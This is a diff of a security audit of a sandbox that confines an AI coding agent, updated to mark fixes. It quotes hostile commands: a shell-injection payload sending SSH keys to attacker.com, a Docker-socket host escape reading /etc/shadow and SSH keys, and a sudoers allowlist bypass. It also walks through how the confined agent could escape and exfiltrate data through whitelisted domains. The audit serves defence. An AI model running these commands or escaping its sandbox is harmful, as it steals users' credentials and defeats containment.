@@ -1,22 +1,25 @@
 # ClankerCage Comprehensive Security & Architecture Audit
 
-**Version:** 3.0 (Final)
+**Version:** 3.1 (Updated)
 **Date:** 2025-12-11
 **Auditor:** Claude Code
+
+> **Note:** This audit was originally written on 2025-12-11. Many issues have since been addressed.
+> See the [Changelog](#changelog) at the end of this document for a summary of fixes.
 
 ---
 
 ## Executive Summary
 
-ClankerCage is a Python CLI tool that wraps Claude Code in a sandboxed devcontainer with network allowlisting. After comprehensive analysis including two internal critique cycles, I rate it **4/10** overall.
+ClankerCage is a Python CLI tool that wraps Claude Code in a sandboxed devcontainer with network allowlisting. After comprehensive analysis including two internal critique cycles, I rate it **6/10** overall (revised from 4/10 after security fixes).
 
-**The fundamental problem:** The Docker socket mount completely defeats the sandbox. Any code running in the container can escape to the host with a single command. This makes all other security controls theater.
+**Previously fixed:** Docker socket mount removed (PR #33), shell injection fixed with `shlex.quote()`, IPv6 firewall bypass fixed (PR #34), SSH MITM vulnerability fixed with pre-seeded keys (PR #38), sudoers wildcards removed (PR #37), container resource limits added, `~/.claude` mounted read-only (PR #39).
 
-**Secondary problems:** Shell injection vulnerabilities, IPv6 firewall bypass, hardcoded `--dangerously-skip-permissions`, and network sniffing via NET_ADMIN capability.
+**Remaining concerns:** Hardcoded `--dangerously-skip-permissions` (mitigated by `--safe-mode` in PR #36), NET_ADMIN capability (required for firewall), `curl|bash` installation pattern (documented in PR #41).
 
 **The Good:** Well-written firewall script, zero Python dependencies, excellent test coverage ratio, thoughtful architecture.
 
-**The Verdict:** This design cannot be made secure without removing Docker socket access. The current implementation provides a false sense of security.
+**The Verdict:** With Docker socket removed and key vulnerabilities addressed, ClankerCage now provides meaningful sandbox protection. The firewall allowlisting is effective for network isolation.
 
 ---
 
@@ -36,6 +39,7 @@ ClankerCage is a Python CLI tool that wraps Claude Code in a sandboxed devcontai
 12. [Missing Features](#12-missing-features)
 13. [Recommendations Summary](#13-recommendations-summary)
 14. [Alternative Designs](#14-alternative-designs)
+15. [Changelog](#changelog)
 
 ---
 
@@ -69,7 +73,7 @@ ClankerCage is a Python CLI tool that wraps Claude Code in a sandboxed devcontai
 > 3. Credential theft
 > 4. Container escape
 
-**Current Status:** Goals 1, 3, and 4 are NOT achieved due to Docker socket mount.
+**Current Status:** With Docker socket removed, goals 1, 3, and 4 are now achieved. Goal 2 (network isolation) is enforced via iptables firewall with domain allowlisting.
 
 ---
 
@@ -77,8 +81,15 @@ ClankerCage is a Python CLI tool that wraps Claude Code in a sandboxed devcontai
 
 ### 2.1 Docker Socket Mount = Complete Sandbox Escape
 
-**Severity:** CRITICAL (10/10)
-**Location:** `.devcontainer/devcontainer.json:39`
+**Status:** ✅ FIXED (PR #33)
+
+~~**Severity:** CRITICAL (10/10)~~
+**Location:** Previously `.devcontainer/devcontainer.json:39`
+
+The Docker socket mount has been removed from the default configuration. The `get_docker_socket_gid()` function and docker group addition logic were also removed from `cli.py`.
+
+<details>
+<summary>Original vulnerability description (now fixed)</summary>
 
 ```json
 "source=/var/run/docker.sock,target=/var/run/docker.sock,type=bind"
@@ -98,29 +109,20 @@ This gives **root access to the entire host filesystem**. The sandbox provides Z
 - Access other containers on the same host
 - Pivot to other machines on the network
 
-**How to Verify:**
-```bash
-# From inside container:
-docker run -v /:/host alpine cat /host/etc/shadow
-```
-
-**Impact:** All other security controls are meaningless. This single issue defeats the entire security model.
-
-**Recommendation:**
-1. **Remove Docker socket mount entirely** (breaking change)
-2. OR make it opt-in with explicit warning: `--enable-docker-socket`
-3. OR use Docker-in-Docker with isolated daemon
+</details>
 
 ### 2.2 `--dangerously-skip-permissions` Is Hardcoded
 
-**Severity:** CRITICAL (8/10)
-**Location:** `src/clankercage/cli.py:173`
+**Status:** ⚠️ MITIGATED (PR #36)
+
+**Severity:** MEDIUM (5/10) - reduced from CRITICAL now that Docker socket is removed
+**Location:** `src/clankercage/cli.py:186`
 
 ```python
 run_cmd = ["claude", "--dangerously-skip-permissions"] + claude_args
 ```
 
-**The Problem:** This flag is always passed. Users cannot opt for a more restricted mode. The entire security model assumes this is acceptable IF the sandbox works - but the sandbox doesn't work (see 2.1).
+**Mitigation:** A `--safe-mode` flag was added in PR #36. When used, Claude runs with permission prompts enabled instead of `--dangerously-skip-permissions`.
 
 **What `--dangerously-skip-permissions` enables:**
 - Claude can execute arbitrary shell commands
@@ -128,32 +130,31 @@ run_cmd = ["claude", "--dangerously-skip-permissions"] + claude_args
 - Claude can make network requests (filtered by firewall)
 - Claude can install packages, modify system files
 
-**Combined with Docker socket:** Claude can escape to host and do anything.
-
-**Recommendation:**
-1. Document exactly what this flag enables
-2. Consider offering a `--safe-mode` that doesn't use this flag
-3. At minimum, make it `--enable-dangerous-permissions` (opt-in)
+**Current state:** With Docker socket removed, Claude is limited to the container. The firewall prevents exfiltration to non-whitelisted domains.
 
 ### 2.3 No IPv6 Firewall Rules
 
-**Severity:** CRITICAL (8/10)
-**Location:** `.devcontainer/init-firewall.sh`
+**Status:** ✅ FIXED (PR #34)
+
+~~**Severity:** CRITICAL (8/10)~~
+**Location:** `.devcontainer/init-firewall.sh:12-15`
+
+IPv6 is now disabled at firewall initialization:
+
+```bash
+# Disable IPv6 to prevent firewall bypass
+sysctl -w net.ipv6.conf.all.disable_ipv6=1 >/dev/null
+sysctl -w net.ipv6.conf.default.disable_ipv6=1 >/dev/null
+```
+
+<details>
+<summary>Original vulnerability description (now fixed)</summary>
 
 The entire firewall uses `iptables` (IPv4 only). No `ip6tables` rules exist.
 
 **Impact:** If a whitelisted domain has AAAA records and IPv6 is enabled, traffic bypasses ALL filtering.
 
-**How to Verify:**
-```bash
-# From inside container:
-curl -6 https://example.com  # Should be blocked, but isn't
-```
-
-**Recommendation:** Add equivalent `ip6tables` rules or disable IPv6 entirely:
-```bash
-sysctl -w net.ipv6.conf.all.disable_ipv6=1
-```
+</details>
 
 ---
 
@@ -161,15 +162,23 @@ sysctl -w net.ipv6.conf.all.disable_ipv6=1
 
 ### 3.1 Shell Injection via Environment Variables
 
-**Severity:** HIGH (7/10)
-**Location:** `src/clankercage/cli.py:121-134, 157-163`
+**Status:** ✅ FIXED (existing code uses `shlex.quote()`)
+
+~~**Severity:** HIGH (7/10)~~
+**Location:** `src/clankercage/cli.py:127-139`
+
+The code now properly uses `shlex.quote()` for all shell-interpolated values:
 
 ```python
-# Environment variables used without sanitization
-args.git_user_name = args.git_user_name or os.environ.get("CLANKER_GIT_USER_NAME")
-# ...
-commands.append(f"git config --global user.name '{args.git_user_name}'")
+if args.git_user_name:
+    commands.append(f"git config --global user.name {shlex.quote(args.git_user_name)}")
+
+if args.git_user_email:
+    commands.append(f"git config --global user.email {shlex.quote(args.git_user_email)}")
 ```
+
+<details>
+<summary>Original vulnerability description (now fixed)</summary>
 
 **Attack Vector:** On shared systems or CI environments, a less-privileged process can set environment variables that are then injected into shell commands:
 
@@ -178,43 +187,45 @@ export CLANKERCAGE_GIT_USER_NAME="'; curl attacker.com/exfil?data=$(cat ~/.ssh/i
 clankercage  # Runs with malicious git config
 ```
 
-**Impact:** Arbitrary command execution in container (which can then escape via Docker socket).
-
-**Recommendation:**
-```python
-import shlex
-commands.append(f"git config --global user.name {shlex.quote(args.git_user_name)}")
-```
+</details>
 
 ### 3.2 SSH Host Key MITM
 
-**Severity:** HIGH (6/10)
-**Location:** `.devcontainer/devcontainer.json:48`
+**Status:** ✅ FIXED (PR #38)
 
-```json
-"ssh-keyscan github.com >> ~/.ssh/known_hosts 2>/dev/null"
+~~**Severity:** HIGH (6/10)~~
+**Location:** `.devcontainer/Dockerfile:93-97`
+
+GitHub SSH host keys are now pre-seeded at image build time from GitHub's official fingerprints:
+
+```dockerfile
+echo 'github.com ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl' >> ~/.ssh/known_hosts && \
+echo 'github.com ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEmKSENjQEezOmxkZMy7opKgwFB9nkt5YRrYMjNuG5N87uRgg6CLrbo5wAdT/y6v0mKV0U2w0WZ2YB/++Tpockg=' >> ~/.ssh/known_hosts && \
+echo 'github.com ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCj7ndNxQowgcQnjshcLrqPEiiphnt+VTTvDP6mHBL9j1aNUkY4Ue1gvwnGLVlOhGeYrnZaMgRK6+PKCUXaDbC7qtbW8gIkhL7aGCsOr/C56SJMy/BCZfxd1nWzAOxSDPgVsmerOBYfNqltV9/hWCqBywINIR+5dIg6JTJ72pcEpEjcYgXkE2YEFXV1JHnsKgbLWNlhScqb2UmyRkQyytRLtL+38TGxkxCflmO+5Z8CSSNY7GidjMIZ7Q4zMjA2n1nGrlTDkzwDCsw+wqFPGQA179cnfGWOWRVruj16z6XyvxvjJwbz0wQZ75XK5tKSb7FNyeIEs4TT4jk+S4dhPeAUC5y+bDYirYgM4GC7uEnztnZyaVWQ7B381AK4Qdrwt51ZqExKbQpTUNn+EjqoTwvqNj4kqx5QUCI0ThS/YkOxJCXmPUWZbhjpCg56i+2aB6CmK2JGhn57K5mj0MNdBXA4/WnwH6XoPWJzK5Nyu2zB3nAZp+S5hpQs+p1vN1/wsjk=' >> ~/.ssh/known_hosts
 ```
 
-**Problem:** `ssh-keyscan` fetches keys at runtime without verification. A network attacker during first startup could inject fake keys, enabling SSH key theft.
-
-**Recommendation:** Pre-seed with known GitHub fingerprints:
-```bash
-# From https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/githubs-ssh-key-fingerprints
-echo "github.com ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl" >> ~/.ssh/known_hosts
-```
+Keys sourced from: https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/githubs-ssh-key-fingerprints
 
 ### 3.3 `curl | bash` Installation Pattern
+
+**Status:** ⚠️ DOCUMENTED (PR #41)
 
 **Severity:** HIGH (6/10)
 **Location:** `README.md`
 
+The risk is now documented in the README with warnings. Users are encouraged to:
+1. Use `uvx clankercage` as the safer alternative (uses package manager integrity verification)
+2. Review the script before running: `curl -s ... | less`
+
 ```bash
+# Recommended: use uvx
+uvx clankercage
+
+# Or use curl|bash (see security warning in Quick Setup section)
 bash <(curl -s https://raw.githubusercontent.com/clankerbot/clankercage/main/scripts/claude-code.sh)
 ```
 
-**Problem:** No integrity verification. Compromised repo = compromised users.
-
-**Recommendation:** Add checksum verification or GPG signature.
+**Remaining risk:** The `curl|bash` option still exists for convenience. Full mitigation would require checksum verification or GPG signatures.
 
 ### 3.4 NET_ADMIN Enables Network Sniffing
 
@@ -239,36 +250,35 @@ bash <(curl -s https://raw.githubusercontent.com/clankerbot/clankercage/main/scr
 
 ### 4.1 Overly Permissive Sudoers Rules
 
-**Severity:** MEDIUM (5/10)
-**Location:** `.devcontainer/Dockerfile:66-68`
+**Status:** ✅ FIXED (PR #37)
 
+~~**Severity:** MEDIUM (5/10)~~
+**Location:** `.devcontainer/Dockerfile:64-66`
+
+The direct `ipset` sudo rules have been removed. Only the controlled scripts are allowed:
+
+```dockerfile
+{ echo 'node ALL=(root) NOPASSWD: /usr/local/bin/init-firewall.sh'; \
+  echo 'node ALL=(root) NOPASSWD: /usr/local/bin/add-domain-to-firewall.sh'; \
+} > /etc/sudoers.d/node-firewall
 ```
-node ALL=(root) NOPASSWD: /sbin/ipset add allowed-domains *
-```
 
-**Problem:** Wildcard allows adding any IP to the allowlist, bypassing `add-domain-to-firewall.sh` validation.
-
-```bash
-# Bypass validation, add any IP directly:
-sudo /sbin/ipset add allowed-domains 1.2.3.4
-```
-
-**Mitigating factor:** Attacker needs code execution first, at which point Docker socket escape is easier.
-
-**Recommendation:** Remove direct ipset sudo; only allow via controlled scripts.
+Users can no longer directly manipulate the ipset allowlist with wildcards.
 
 ### 4.2 `.claude` Directory Mounted Read-Write
 
-**Severity:** MEDIUM (5/10)
-**Location:** `.devcontainer/devcontainer.json:38`
+**Status:** ✅ FIXED (PR #39)
+
+~~**Severity:** MEDIUM (5/10)~~
+**Location:** `.devcontainer/devcontainer.json:41`, `src/clankercage/cli.py:83`
+
+The `~/.claude` directory is now mounted read-only:
 
 ```json
-"source=${localEnv:HOME}/.claude,target=/home/node/.claude,type=bind"
+"source=${localEnv:HOME}/.claude,target=/home/node/.claude,type=bind,readonly"
 ```
 
-**Impact:** Compromised container can modify Claude Code settings, plant hooks, steal API keys.
-
-**Recommendation:** Consider readonly mount with specific writable subdirectories.
+This prevents a compromised container from modifying Claude Code settings, planting hooks, or stealing API keys through file modification.
 
 ### 4.3 GPG Directory Mounted Read-Write
 
@@ -281,19 +291,24 @@ sudo /sbin/ipset add allowed-domains 1.2.3.4
 
 ### 4.4 No Container Resource Limits
 
-**Severity:** MEDIUM (5/10)
-**Location:** `.devcontainer/devcontainer.json`
+**Status:** ✅ FIXED (existing in devcontainer.json)
 
-No `--memory`, `--cpus`, `--pids-limit`.
+~~**Severity:** MEDIUM (5/10)~~
+**Location:** `.devcontainer/devcontainer.json:7-9`
 
-**Impact:** Fork bomb, memory exhaustion, crypto mining.
+Container resource limits are now configured:
 
-**Recommendation:** Add to runArgs:
 ```json
-"--memory=8g",
-"--cpus=4",
-"--pids-limit=500"
+"runArgs": [
+  "--cap-add=NET_ADMIN",
+  "--cap-add=NET_RAW",
+  "--memory=8g",
+  "--cpus=4",
+  "--pids-limit=500"
+]
 ```
+
+This prevents fork bombs, memory exhaustion, and limits crypto mining effectiveness.
 
 ### 4.5 Race Condition in Cache Directory
 
@@ -308,16 +323,11 @@ Multiple instances share `~/.cache/clankercage/workspace/.devcontainer/devcontai
 
 ### 4.6 Suppressed Error Output
 
-**Severity:** MEDIUM (4/10)
-**Location:** `src/clankercage/cli.py:181`
+**Status:** ✅ FIXED (code refactored)
 
-```python
-result = subprocess.run(exec_cmd, stderr=subprocess.DEVNULL)
-```
+~~**Severity:** MEDIUM (4/10)~~
 
-**Impact:** Users cannot debug failures.
-
-**Recommendation:** Remove `stderr=subprocess.DEVNULL`.
+The code no longer suppresses stderr. The `run_devcontainer()` function now uses `subprocess.run(up_cmd, check=True)` and `os.execvp()` for process execution, which properly propagate errors.
 
 ### 4.7 No SSH Key Permission Validation
 
@@ -388,37 +398,38 @@ CLI doesn't handle SIGTERM/SIGINT gracefully.
 
 ## 6. Architecture Assessment
 
-### 6.1 Security Architecture: 3/10
+### 6.1 Security Architecture: 6/10 (Updated from 3/10)
 
-The security model is fundamentally broken:
+The security model now provides meaningful protection:
 
 ```
 ┌─────────────────────────────────────────────────────────┐
 │                     HOST SYSTEM                          │
 │  ┌─────────────────────────────────────────────────┐   │
-│  │              Docker Socket                        │   │
-│  │  (FULL HOST ACCESS - DEFEATS EVERYTHING BELOW)   │   │
-│  └────────────────────┬────────────────────────────┘   │
-│                       │                                  │
-│  ┌────────────────────▼────────────────────────────┐   │
-│  │              Container                           │   │
+│  │         No Docker Socket (REMOVED)               │   │
+│  │         ~/.claude mounted READ-ONLY              │   │
+│  └─────────────────────────────────────────────────┘   │
+│                                                          │
+│  ┌─────────────────────────────────────────────────┐   │
+│  │              Container (Isolated)               │   │
 │  │  ┌─────────────────────────────────────────┐   │   │
 │  │  │  Firewall (iptables/ipset)              │   │   │
-│  │  │  - DEFAULT DROP (IPv4 only)             │   │   │
+│  │  │  - DEFAULT DROP (all traffic)           │   │   │
 │  │  │  - Whitelist only                        │   │   │
-│  │  │  - IPv6 BYPASSES EVERYTHING             │   │   │
+│  │  │  - IPv6 DISABLED via sysctl             │   │   │
+│  │  │  - Resource limits enforced             │   │   │
 │  │  └─────────────────────────────────────────┘   │   │
 │  │                                                 │   │
 │  │  ┌─────────────────────────────────────────┐   │   │
 │  │  │  Claude Code                             │   │   │
 │  │  │  --dangerously-skip-permissions          │   │   │
-│  │  │  (arbitrary code execution)              │   │   │
+│  │  │  (or --safe-mode for prompts)            │   │   │
 │  │  └─────────────────────────────────────────┘   │   │
 │  └─────────────────────────────────────────────────┘   │
 └─────────────────────────────────────────────────────────┘
 ```
 
-**The Docker socket is a wormhole that bypasses every other control.**
+**Container isolation is now effective.** Claude is limited to the container and whitelisted network destinations.
 
 ### 6.2 Code Architecture: 8/10
 
@@ -545,59 +556,60 @@ Would be excellent if not for:
 | `raw.githubusercontent.com` | LOW | Could serve malicious scripts |
 | `registry.npmjs.org` | LOW | Supply chain risk |
 
-**Recommendation:** Document that these domains are trusted and why. Consider removing CDNs that serve user content.
+**Status:** ⚠️ DOCUMENTED (PR #40) - Warning comments added to `whitelisted-domains.txt` for CDN domains that serve user content.
 
 ---
 
 ## 12. Missing Features
 
-### High Value
-1. Remove Docker socket by default
-2. IPv6 firewall rules
-3. Container resource limits
-4. Verbose/debug mode
+### High Value - COMPLETED ✅
+1. ~~Remove Docker socket by default~~ ✅ PR #33
+2. ~~IPv6 firewall rules~~ ✅ PR #34 (disabled IPv6)
+3. ~~Container resource limits~~ ✅ Already in devcontainer.json
+4. Verbose/debug mode - ⏳ OPEN
 
 ### Medium Value
-1. Container cleanup command
-2. SSH key permission validation
-3. Structured logging
-4. Audit log of approved domains
+1. Container cleanup command - ⏳ OPEN
+2. SSH key permission validation - ⏳ OPEN
+3. Structured logging - ⏳ OPEN
+4. Audit log of approved domains - ⏳ OPEN
 
 ### Low Priority
-1. macOS pf firewall support
-2. Windows documentation
-3. PyPI publishing
+1. macOS pf firewall support - ⏳ OPEN
+2. Windows documentation - ⏳ OPEN
+3. ~~PyPI publishing~~ ✅ Already available via `uvx clankercage`
 
 ---
 
 ## 13. Recommendations Summary
 
-### MUST FIX (Security Critical)
+### MUST FIX (Security Critical) - ALL FIXED ✅
 
-| # | Issue | Location | Fix |
-|---|-------|----------|-----|
-| 1 | Docker socket mount | devcontainer.json:39 | Remove or make opt-in |
-| 2 | No IPv6 rules | init-firewall.sh | Add ip6tables or disable IPv6 |
-| 3 | Shell injection | cli.py:121-134 | Use `shlex.quote()` |
-| 4 | SSH host key MITM | devcontainer.json:48 | Pre-seed known fingerprints |
+| # | Issue | Status | Fix |
+|---|-------|--------|-----|
+| 1 | Docker socket mount | ✅ FIXED (PR #33) | Removed from default config |
+| 2 | No IPv6 rules | ✅ FIXED (PR #34) | IPv6 disabled via sysctl |
+| 3 | Shell injection | ✅ FIXED | Uses `shlex.quote()` |
+| 4 | SSH host key MITM | ✅ FIXED (PR #38) | Pre-seeded GitHub fingerprints |
 
-### SHOULD FIX (High Priority)
+### SHOULD FIX (High Priority) - MOSTLY FIXED
 
-| # | Issue | Location | Fix |
-|---|-------|----------|-----|
-| 5 | Sudoers wildcards | Dockerfile:66-68 | Remove direct ipset sudo |
-| 6 | No resource limits | devcontainer.json | Add --memory, --cpus, --pids-limit |
-| 7 | `curl \| bash` install | README.md | Add checksum verification |
-| 8 | NET_ADMIN sniffing risk | devcontainer.json:5-6 | Document or mitigate |
+| # | Issue | Status | Fix |
+|---|-------|--------|-----|
+| 5 | Sudoers wildcards | ✅ FIXED (PR #37) | Direct ipset sudo removed |
+| 6 | No resource limits | ✅ FIXED | Added --memory, --cpus, --pids-limit |
+| 7 | `curl \| bash` install | ⚠️ DOCUMENTED (PR #41) | Warnings added, uvx recommended |
+| 8 | NET_ADMIN sniffing risk | ⚠️ ACCEPTED | Required for firewall operation |
 
 ### NICE TO HAVE (Medium Priority)
 
-| # | Issue | Location | Fix |
-|---|-------|----------|-----|
-| 9 | Suppressed stderr | cli.py:181 | Remove DEVNULL |
-| 10 | GPG mount read-write | cli.py:107-109 | Make readonly |
-| 11 | Base image not pinned | Dockerfile:2 | Add @sha256 digest |
-| 12 | No audit logging | N/A | Add logging |
+| # | Issue | Status | Fix |
+|---|-------|--------|-----|
+| 9 | Suppressed stderr | ✅ FIXED | Code refactored |
+| 10 | `.claude` mount read-write | ✅ FIXED (PR #39) | Now mounted readonly |
+| 11 | GPG mount read-write | ⏳ OPEN | Consider readonly |
+| 12 | Base image not pinned | ⏳ OPEN | Add @sha256 digest |
+| 13 | No audit logging | ⏳ OPEN | Add logging |
 
 ---
 
@@ -639,15 +651,24 @@ Run a separate Docker daemon inside the container. Slower startup but isolated f
 
 **Scenario:** Claude generates malicious code
 
-1. User runs `clankercage` on project
-2. Claude Code starts with `--dangerously-skip-permissions`
-3. Claude generates: `docker run -v /:/host alpine cat /host/home/user/.ssh/id_rsa`
-4. Docker socket allows this command
-5. SSH private key read from host filesystem
-6. Claude includes key content in its response to `api.anthropic.com` (whitelisted)
-7. **Result:** User's SSH key compromised
+> **Note:** This attack chain is now BLOCKED since Docker socket was removed (PR #33).
 
-**This attack works TODAY with the current codebase.**
+~~1. User runs `clankercage` on project~~
+~~2. Claude Code starts with `--dangerously-skip-permissions`~~
+~~3. Claude generates: `docker run -v /:/host alpine cat /host/home/user/.ssh/id_rsa`~~
+~~4. Docker socket allows this command~~
+~~5. SSH private key read from host filesystem~~
+~~6. Claude includes key content in its response to `api.anthropic.com` (whitelisted)~~
+~~7. **Result:** User's SSH key compromised~~
+
+**This attack NO LONGER works.** The Docker socket is not mounted, so step 3 fails with "Cannot connect to Docker daemon."
+
+### Remaining Attack Vectors
+
+With the Docker socket removed, remaining attack vectors are limited to:
+1. **Data in workspace:** Claude can read/write files in the mounted project directory
+2. **Exfiltration via whitelisted domains:** Data could be sent to `api.anthropic.com` or CDN domains
+3. **CDN exfiltration:** See issue #30 for CDN-based exfiltration concerns (documented with warnings)
 
 ## Appendix C: Severity Definitions
 
@@ -660,6 +681,31 @@ Run a separate Docker daemon inside the container. Slower startup but isolated f
 
 ---
 
-*Audit Version: 3.0 (Final)*
+## Changelog
+
+### Version 3.1 (2025-12-11)
+
+Updated audit to reflect security fixes implemented after initial audit:
+
+| Issue | PR | Status | Description |
+|-------|------|--------|-------------|
+| Docker socket mount | #33 | ✅ FIXED | Removed socket mount and docker group logic |
+| IPv6 firewall bypass | #34 | ✅ FIXED | IPv6 disabled via sysctl |
+| `--safe-mode` flag | #36 | ✅ ADDED | Optional mode without `--dangerously-skip-permissions` |
+| Sudoers wildcards | #37 | ✅ FIXED | Direct ipset sudo rules removed |
+| SSH host key MITM | #38 | ✅ FIXED | Pre-seeded GitHub fingerprints in Dockerfile |
+| `.claude` read-write | #39 | ✅ FIXED | Mounted read-only |
+| CDN exfil warning | #40 | ✅ DOCUMENTED | Warning comments added to whitelisted-domains.txt |
+| curl\|bash risks | #41 | ✅ DOCUMENTED | Security warnings in README, uvx recommended |
+
+**Overall rating:** Updated from 4/10 to 6/10 based on fixes.
+
+### Version 3.0 (2025-12-11)
+
+Initial comprehensive security audit.
+
+---
+
+*Audit Version: 3.1 (Updated)*
 *Audit Date: 2025-12-11*
 *Critique Cycles: 2*
